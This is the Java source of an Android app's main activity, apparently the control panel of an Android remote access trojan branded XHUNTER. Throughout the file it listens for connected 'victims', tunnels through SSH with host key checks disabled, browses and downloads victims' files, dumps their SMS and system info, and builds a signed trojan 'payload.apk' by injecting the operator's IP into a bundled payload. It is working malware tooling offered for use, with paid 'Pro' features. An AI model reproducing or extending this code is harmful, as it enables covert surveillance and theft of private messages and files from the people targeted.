package com.master.server;

import com.android.apksigner.ApkSignerTool;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;
import android.Manifest;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.PorterDuff;
import android.graphics.PorterDuffColorFilter;
import android.graphics.drawable.Drawable;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {
    public boolean victim_flag=false;
    public boolean listen_flag=false;
    public boolean build_flag=true;
    public int count=0;
    private ServerSocket serverSocket;
    public Socket tempClientSocket;
    Thread serverThread = null;
    Thread apkbuilder=null;
    Session session= null;
    private String root_path="/data/data/com.master.server/";
    //public static final int SERVER_PORT = 3003;
    private LinearLayout msgList;
    private LinearLayout msg;
    private EditText hst;
    private EditText unme;
    private EditText pwd;
    private EditText tstmsg;
    private EditText p_ip;
    private String payload_ip;
    private Handler handler;
    private int greenColor,cyan;
    private ArrayAdapter<String> adapter;
    private String dir="";
    private String host="",user="",pass="";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);
        greenColor = ContextCompat.getColor(this, R.color.green);
        cyan=ContextCompat.getColor(this,R.color.cyan);
        handler = new Handler();
        msgList = findViewById(R.id.msgList);
    }
    public TextView textView(String message, int color) {
        if (null == message || message.trim().isEmpty()) {
            message = "<Empty Message>";
        }
        TextView tv = new TextView(this);
        tv.setTextColor(color);
        tv.setText(message + " [" + getTime() +"]");
        tv.setTextSize(20);
        tv.setPadding(0, 5, 0, 0);
        return tv;
    }
    public TextView smsView(String message, int color) {
        if (null == message || message.trim().isEmpty()) {
            message = "<Empty Message>";
        }
        TextView tv = new TextView(this);
        tv.setTextColor(color);
        tv.setText(message);
        tv.setTextSize(20);
        tv.setPadding(0, 5, 0, 0);
        return tv;
    }
    public void showMessage(final String message, final int color) {
        handler.post(new Runnable() {
            @Override
            public void run() {
                msgList.addView(textView(message,color));
            }
        });
    }
    private void show_sms(final String sms,final int color){
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                msg=findViewById(R.id.msg);
                msg.addView(smsView(sms,color));
            }});}
    private void log_mess(final String msgs,final int color){
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                msg=findViewById(R.id.log);
                msg.addView(textView(msgs,color));
            }});}

    @Override
    public void onClick(View view) {
         if (view.getId() == R.id.local_connect) {
            if(count==0){
                Drawable mDrawable = ContextCompat.getDrawable(MainActivity.this,R.drawable.ic_power_settings_new_black_24dp);
                mDrawable.setColorFilter(new
                        PorterDuffColorFilter(Color.RED, PorterDuff.Mode.SRC_IN));
                listen_flag=true;
            this.serverThread = new Thread(new ServerThread());
            this.serverThread.start();
            count++;}
            else if(count>0){
                try {
                    serverSocket.close();
                    maketoast("Stopped");
                } catch (IOException e) {
                    e.printStackTrace();
                }
                serverSocket=null;
                serverThread.interrupt();
                serverThread = null;
                showMessage("Stopped !!",Color.RED);
                listen_flag=false;
                count=0;
            }
            return;
        }
        if (view.getId() == R.id.connect_remote) {
            if(listen_flag==true){maketoast("Stop Listening Local Victim First");}
            else setContentView(R.layout.ssh_tunel);
            return;
        }
        if (view.getId() == R.id.build_payload) {
            if(!(ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)){
                ActivityCompat.requestPermissions(this,
                        new String[] {Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
            }
            if(!(ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)){
                maketoast("please give storage permission");
            }
            if((ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)) {
                File wallpaperDirectory = new File("/sdcard/XHUNTER/");
                wallpaperDirectory.mkdirs();
                if(listen_flag==true){maketoast("Stop Listening Local Victim First");}
                else setContentView(R.layout.payload_build);

            }
        }
        if (view.getId() == R.id.build) {
            if(build_flag) {
                build_flag=false;
                p_ip = findViewById(R.id.payload_ip);
                payload_ip = p_ip.getText().toString().trim();
                this.apkbuilder = new Thread(new build_payload());
                this.apkbuilder.start();
            }
            else{maketoast("Build App in Progress !!");}
            return;
        }
        if (view.getId() == R.id.build_back) {
            if (build_flag){
                maketoast("Good Bye");
                android.os.Process.killProcess(android.os.Process.myPid());
            }else{maketoast("Build App in Progress !!");}
        }
        if (view.getId() == R.id.start_tunnel_server) {
            hst=findViewById(R.id.host_ip);
            unme=findViewById(R.id.username);
            pwd=findViewById(R.id.pass);
            host=hst.getText().toString().trim();
            user=unme.getText().toString().trim();
            pass=pwd.getText().toString().trim();
            if(serverSocket==null){
                log_mess("Connecting..",cyan);
                maketoast("Connecting...");
                this.serverThread=new Thread(new SSHTunnel());
                this.serverThread.start();

            }
            else if(serverSocket!=null&&serverThread!=null){
                try {
                    serverSocket.close();
                    maketoast("Disconnected");
                } catch (IOException e) {
                    e.printStackTrace();
                }
                session.disconnect();
                serverThread.interrupt();
                serverThread = null;
                serverSocket=null;
                count=0;
            }
            return;
        }
        if (view.getId() == R.id.victim_panel) {
            if(victim_flag){victim_panel();}
            else maketoast("No Victim Connected");
            }

        if (view.getId() == R.id.file_explorer) {
            if(!(ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)){
                ActivityCompat.requestPermissions(this,
                        new String[] {Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
            }
            if(!(ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)){
                maketoast("please give storage permission");
            }
            if((ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)) {
                File wallpaperDirectory = new File("/sdcard/XHUNTER/");
                wallpaperDirectory.mkdirs();
                if (victim_flag) {
                    setContentView(R.layout.file_explorer);
                    setTitle("File Explorer");
                    adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1) {
                        @Override
                        public View getView(int position, View convertView, ViewGroup parent) {
                            // Get the Item from ListView
                            View view = super.getView(position, convertView, parent);

                            // Initialize a TextView for ListView each Item
                            TextView tv = (TextView) view.findViewById(android.R.id.text1);

                            // Set the text color of TextView (ListView Item)
                            tv.setTextColor(cyan);

                            // Generate ListView Item using TextView
                            return view;
                        }
                    };
                    sendMessage("ls");
                } else maketoast("No Victim Connected");
            }


        }
        if (view.getId() == R.id.sys_info) {
            if(victim_flag){
            setContentView(R.layout.dump_sms);
            setTitle("SYS INFO");
            sendMessage("sys_info");
            }
            else maketoast("No Victim Connected");
        }
        if (view.getId() == R.id.dump_sms) {
            if(victim_flag) {
                setContentView(R.layout.dump_sms);
                setTitle("SMS");
                sendMessage("dump_sms");
            }
            else maketoast("No Victim Connected");
            }
        if (view.getId() == R.id.back) {
            dir = dir.replaceAll("[^/]*/$", "");
            System.out.println("dir "+dir);
            if(dir.equals("")){
             victim_panel();
            }
            else {
                setContentView(R.layout.file_explorer);
                adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1){
                    @Override
                    public View getView(int position, View convertView, ViewGroup parent){
                        // Get the Item from ListView
                        View view = super.getView(position, convertView, parent);

                        // Initialize a TextView for ListView each Item
                        TextView tv = (TextView) view.findViewById(android.R.id.text1);

                        // Set the text color of TextView (ListView Item)
                        tv.setTextColor(cyan);

                        // Generate ListView Item using TextView
                        return view;
                    }};
                sendMessage("cd " + dir);
            }
        }
        if (view.getId() == R.id.camera||view.getId() == R.id.micro_phone||view.getId() == R.id.screen_record||view.getId() == R.id.screen_shot||view.getId() == R.id.gps)
        {maketoast("Buy Pro Version to Unlock");}
        if(view.getId() == R.id.send_toast){
            if(victim_flag) {
                setContentView(R.layout.send_toast);
            }
            else maketoast("No Victim Connected");
        }
        if(view.getId() == R.id.send_toast_message){
            if(victim_flag){
            tstmsg=findViewById(R.id.toast_message);
            sendMessage("toast"+tstmsg.getText().toString().trim());
            maketoast("Message Sent");}
            else maketoast("No Victim Connected");
        }
        if(view.getId() == R.id.exit_app){android.os.Process.killProcess(android.os.Process.myPid());}
    }
    private void victim_panel(){runOnUiThread(new Runnable() {
        @Override
        public void run() {
            setContentView(R.layout.victim_panel);
            setTitle("Victim Panel");
        }
    });}
    private void file_manager(final String data){
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
               final ListView listView=(ListView) findViewById(R.id.listview);
               listView.setAdapter(adapter);
               adapter.add(data);
               adapter.notifyDataSetChanged();
               listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
                   @Override
                   public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                       TextView mytext=(TextView) view ;
                       dir=dir+mytext.getText().toString()+"/";
                       adapter.clear();
                       sendMessage("cd "+dir);
                       //Toast.makeText(MainActivity.this,mytext.getText().toString(),Toast.LENGTH_SHORT).show();
                   }
               });
            }
        });
    }
    private void maketoast(final String message){

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
        Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();}});
    }
    private void sendMessage(final String message) {
        try {
            if (null != tempClientSocket) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        PrintWriter out = null;
                        try {
                            out = new PrintWriter(new BufferedWriter(
                                    new OutputStreamWriter(tempClientSocket.getOutputStream())),
                                    true);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        out.println(message);
                    }
                }).start();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    class ServerThread implements Runnable {

        public void run() {
            Socket socket;
            try {
                serverSocket = new ServerSocket(3003);
                showMessage("XhunTer iS wAitIng foR VicTim tO cOnect..", cyan);
                // findViewById(R.id.start_server).setVisibility(View.GONE);
            } catch (IOException e) {
                e.printStackTrace();
                showMessage("Error Starting Server : " + e.getMessage(), Color.RED);
            }
            if (null != serverSocket) {
                while (!Thread.currentThread().isInterrupted()) {
                    try {
                        socket = serverSocket.accept();
                        CommunicationThread commThread = new CommunicationThread(socket);
                        new Thread(commThread).start();
                    } catch (IOException e) {
                        e.printStackTrace();
                        }
                }
            }

        }
    }
    public class SSHTunnel implements Runnable {
        public void run() {

            int lport=3003;
            String lhost="localhost";
            int rport=3003;

            try{
                //Set StrictHostKeyChecking property to no to avoid UnknownHostKey issue
                java.util.Properties config = new java.util.Properties();
                config.put("StrictHostKeyChecking", "no");
                JSch jsch = new JSch();
                session=jsch.getSession(user, host, 22);
                session.setPassword(pass);
                session.setConfig(config);
                session.connect();
                log_mess("Connected to your server",cyan);
                session.setPortForwardingR(rport, lhost, lport);

               log_mess(lhost+":"+lport+" -> "+host+":"+rport,cyan);
               log_mess("Port Forwarded",cyan);

                //Server Listening
                Socket socket;
                try {
                    serverSocket = new ServerSocket(3003);
                    log_mess("XhunTer iS wAitIng foR VicTim tO cOnect..", cyan);
                    // findViewById(R.id.start_server).setVisibility(View.GONE);
                } catch (IOException e) {
                    e.printStackTrace();
                    log_mess("Error Starting Server : " + e.getMessage(), Color.RED);
                }
                if (null != serverSocket) {
                    while (!Thread.currentThread().isInterrupted()) {
                        try {
                            socket = serverSocket.accept();
                            CommunicationThread commThread = new CommunicationThread(socket);
                            new Thread(commThread).start();
                        } catch (IOException e) {
                            e.printStackTrace();
                            log_mess("Error Communicating to Client :" + e.getMessage(), Color.RED);
                        }
                    }
                }
            }catch(Exception e){
                e.printStackTrace();
                log_mess(e.getMessage(),Color.RED);

            }
        }
    }
    class CommunicationThread implements Runnable {

        private Socket clientSocket;
        private BufferedReader input;
        private DataInputStream din;

        public CommunicationThread(Socket clientSocket) {
            this.clientSocket = clientSocket;
            tempClientSocket = clientSocket;
            try {
                this.input = new BufferedReader(new InputStreamReader(this.clientSocket.getInputStream()));//this socket is used for message purpose
                this.din=new DataInputStream(this.clientSocket.getInputStream());//this socket used for downloading files
            } catch (IOException e) {
                e.printStackTrace();
                log_mess("Error Connecting to Victim!!", Color.RED);
                showMessage("Error Connecting to Victim!!", Color.RED);
            }
            log_mess("Victim Connected", greenColor);
            showMessage("Victim Connected", greenColor);
            maketoast("Victim Online");
            victim_flag=true;

        }

        public void run() {

            while (!Thread.currentThread().isInterrupted()) {

                try {
                    String read = input.readLine();
                    if (null == read || "Disconnect".contentEquals(read)) {
                        Thread.interrupted();
                        read = "Victim Disconnected";
                        showMessage(read,Color.RED);
                        victim_flag=false;
                        maketoast(read);
                        break;
                    }

                    if(read.matches("EM(.*)"))
                    {
                        file_manager(read.replaceAll("EM",""));
                    }
                   if(read.matches("DW(.*)"))
                    {
                        maketoast("downloading...");

                        int size=0;
                        String filename = Environment.getExternalStorageDirectory().toString()+"/XHUNTER/";
                        filename=filename+read.replaceAll("DW","");

                        FileOutputStream fos=new FileOutputStream(new File(filename),true);
                        do{
                            size=Integer.parseInt(input.readLine());
                            byte b[]=new byte [size];
                            din.readFully(b);
                            System.out.println("file size: "+b.length);
                            fos.write(b);
                        }while(!(size<(1024*1024)));
                        maketoast("Downloaded file"+filename);
                        fos.close();
                    }
                    if(read.matches("sms_add(.*)")){
                        read=read.replaceAll("sms_add","");
                        show_sms(read,Color.RED);
                    }
                    if(read.matches("sms_bd(.*)")){
                        read=read.replaceAll("sms_bd","");
                         show_sms(read,cyan);
                    }
                    if(read.matches("sms_dt(.*)")){
                        read=read.replaceAll("sms_dt","");
                         show_sms(read,Color.BLUE);
                    }
                    if(read.matches("info(.*)")){
                        read=read.replaceAll("info","");
                        show_sms(read,cyan);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        }

    }
    private class build_payload implements Runnable{
        public void run(){
        show_sms(">>Building Payload.apk....",cyan);
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            show_sms(">>Loading Resources...",cyan);
        unload(root_path+"payload.zip","payload.zip");//payload
            unload(root_path+"ip.txt","ip.txt");
            unload(root_path+"test.pem","test.pem");
            unload(root_path+"test.pk8","test.pk8");
        try {
            unzip(new File(root_path+"payload.zip"), new File("/sdcard/XHUNTER/payload"));//unziping payload
        } catch (IOException e) {
            e.printStackTrace();
        }
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            show_sms(">>Injecting Malicious Code...",cyan);
            edit_app(payload_ip);
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            show_sms(">>Compiling Payload.apk",cyan);
        zip("/sdcard/XHUNTER/payload","/sdcard/XHUNTER/unsigned.apk");//zip app after editing
        show_sms(">>Signing Payload.apk",cyan);
        sign();
            try {
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        show_sms(">>Done !!",Color.GREEN);
        show_sms("Saved:-> /sdcard/payload.apk",cyan);
        build_flag=true;

    }
    }
    private void unload(String path,String _assets_zip){
        InputStream inputstream=null;
        try{
            inputstream =(getAssets().open(_assets_zip));
            OutputStream out=new FileOutputStream(path);
            byte b[] =new byte[1024];
            int len;
            while((len=inputstream.read(b))>0){
                out.write(b);
            }

        }catch (IOException e){}

    }
    public static void unzip(File zipFile, File targetDirectory) throws IOException {
        ZipInputStream zis = new ZipInputStream(
                new BufferedInputStream(new FileInputStream(zipFile)));
        try {
            ZipEntry ze;
            int count;
            byte[] buffer = new byte[8192];
            while ((ze = zis.getNextEntry()) != null) {
                File file = new File(targetDirectory, ze.getName());
                File dir = ze.isDirectory() ? file : file.getParentFile();
                if (!dir.isDirectory() && !dir.mkdirs())
                    throw new FileNotFoundException("Failed to ensure directory: " +
                            dir.getAbsolutePath());
                if (ze.isDirectory())
                    continue;
                FileOutputStream fout = new FileOutputStream(file);
                try {
                    while ((count = zis.read(buffer)) != -1)
                        fout.write(buffer, 0, count);
                } finally {
                    fout.close();
                }
            /* if time should be restored as well
            long time = ze.getTime();
            if (time > 0)
                file.setLastModified(time);
            */
            }
        } finally {

            zis.close();
        }
    }
    private void edit_app(String ip){
        String fileName = root_path+"ip.txt";
        File file = new File(fileName);
        FileReader fr = null;
        String line;
        try {
            fr = new FileReader(file);
            BufferedReader br = new BufferedReader(fr);
            FileWriter fw=new FileWriter("/sdcard/XHUNTER/payload/assets/ip.txt");
            while((line=br.readLine()) != null){
                fw.write(line.replaceAll("192.168.43.1",ip));
            }//loop
            fw.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }catch (IOException e) {
            e.printStackTrace();
        }
    }
    List<String> filesListInDir = new ArrayList<String>();
    private void zip(String folder_path,String output_app) {
        File dir = new File(folder_path);
        String zipDirName = output_app;
        zipDirectory(dir, zipDirName);
    }
    private void zipDirectory(File dir, String zipDirName) {
        try {
            populateFilesList(dir);
            //now zip files one by one
            //create ZipOutputStream to write to the zip file
            FileOutputStream fos = new FileOutputStream(zipDirName);
            ZipOutputStream zos = new ZipOutputStream(fos);
            for(String filePath : filesListInDir){
                System.out.println("Zipping "+filePath);
                //for ZipEntry we need to keep only relative file path, so we used substring on absolute path
                ZipEntry ze = new ZipEntry(filePath.substring(dir.getAbsolutePath().length()+1, filePath.length()));
                zos.putNextEntry(ze);
                //read the file and write to ZipOutputStream
                FileInputStream fis = new FileInputStream(filePath);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) > 0) {
                    zos.write(buffer, 0, len);
                }
                zos.closeEntry();
                fis.close();
            }
            zos.close();
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private void populateFilesList(File dir) throws IOException {
        File[] files = dir.listFiles();
        for(File file : files){
            if(file.isFile()) filesListInDir.add(file.getAbsolutePath());
            else populateFilesList(file);
        }
    }
    void sign() {
        try {
            ApkSignerTool.main(new String[]{"sign", "--key", root_path+"test.pk8", "--cert", root_path+"test.pem", "--out", "/sdcard/payload.apk", "/sdcard/XHUNTER/unsigned.apk"});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

        String getTime() {
        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
        return sdf.format(new Date());
    }
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (null != serverThread) {
            sendMessage("Disconnect");
            serverThread.interrupt();
            serverThread = null;
        }
        android.os.Process.killProcess(android.os.Process.myPid());
    }
}